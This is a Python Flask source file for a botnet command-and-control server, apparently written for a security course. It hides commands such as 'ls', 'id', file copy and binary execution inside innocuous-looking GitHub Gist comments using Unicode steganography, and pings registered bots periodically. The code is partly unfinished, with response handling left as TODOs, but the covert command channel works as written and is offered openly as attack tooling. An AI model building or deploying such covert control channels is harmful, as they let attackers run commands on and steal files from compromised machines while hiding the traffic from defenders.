import atexit
import json

import requests
from apscheduler.schedulers.background import BackgroundScheduler
from flask import Flask, request
import pyUnicodeSteganography as usteg

TOKEN = "your-personal-access-token"  # Your GitHub personal access token
API_URL = "https://api.github.com/gists"  # The URL of the GitHub Gist API
HEADERS = {"Authorization": f"Bearer {TOKEN}"}  # Set the authorization header
CHECKING_BOT_PERIOD_SECONDS = 120
SCHEDULER = BackgroundScheduler()
SCHEDULER.start()
BOT_SCHEDULE_JOB_DICTIONARY = {}

app = Flask(__name__)


@app.route("/register-bot", methods=["POST"])
def register_bot():
    gist_id = create_gist()

    job = SCHEDULER.add_job(func=bot_check_alive, args=[gist_id], trigger="interval",
                            seconds=CHECKING_BOT_PERIOD_SECONDS)
    BOT_SCHEDULE_JOB_DICTIONARY[gist_id] = job.id

    return app.response_class(
        response=json.dumps({"gist_id": gist_id}),
        status=201,
        mimetype='application/json'
    )


@app.route("/unregister-bot", methods=["DELETE"])
def unregister_bot():
    event_data = request.get_json()
    gist_id = event_data.get("gist_id")
    delete_gist(gist_id)

    job_id = BOT_SCHEDULE_JOB_DICTIONARY[gist_id]
    SCHEDULER.remove_job(job_id=job_id)

    return app.response_class(
        response="Gist has been deleted",
        status=200,
        mimetype='text/plain'
    )


def bot_cmd_w(gist_id) -> str:
    message = "What do you think about my code snippet?"
    secret = "[REQ w]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    pass


def bot_cmd_ls(path, gist_id) -> str:
    message = "I need to add comments inside my code :("
    secret = "[REQ ls " + path + "]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    pass


def bot_cmd_id(gist_id) -> str:
    message = "Can someone do code review of this? Thank you. :)"
    secret = "[REQ id]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    pass


def bot_copy_file(file_name, gist_id) -> str:
    message = "I can't find bug, please help me."
    secret = "[REQ copy " + file_name + "]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    # TODO bytes to file and store it after that
    pass


def bot_execute_binary(binary, gist_id) -> str:
    message = "Do you like BSY?"
    secret = "[REQ binary " + binary + "]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    pass


def bot_check_alive(gist_id):
    message = "Is anyone here?"
    secret = "[REQ alive]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)
    # TODO wait for response comment
    pass


def get_gist_comments(gist_id):
    url = API_URL + "/" + gist_id + "/comments"
    response = requests.get(url, headers=HEADERS)
    return response.json()


def add_gist_comment(gist_id, message):
    data = {
        "body": message
    }

    url = API_URL + "/" + gist_id + "/comments"

    requests.post(url, json=data, headers=HEADERS)
    return


def create_gist() -> str:
    """
    Create new gist via github API for next communication with bot.
    :return: Return new gist ID.
    """

    # TODO randomize gist data
    data = {
        "description": "My new gist",
        "public": True,
        "files": {
            "file1.txt": {
                "content": "Hello, world!"
            }
        }
    }

    response = requests.post(API_URL, json=data, headers=HEADERS)
    return response.json().get("id")


def delete_gist(gist_id):
    """
    Delete gist via github API.
    :return:
    """
    url = API_URL + "/" + gist_id
    requests.delete(url, headers=HEADERS)
    return


def run_flask_server():
    app.run(host="0.0.0.0", port=5000)


def unregister_all_on_exit():
    for key, value in BOT_SCHEDULE_JOB_DICTIONARY.items():
        delete_gist(key)


run_flask_server()

atexit.register(lambda: unregister_all_on_exit())
atexit.register(lambda: SCHEDULER.shutdown())
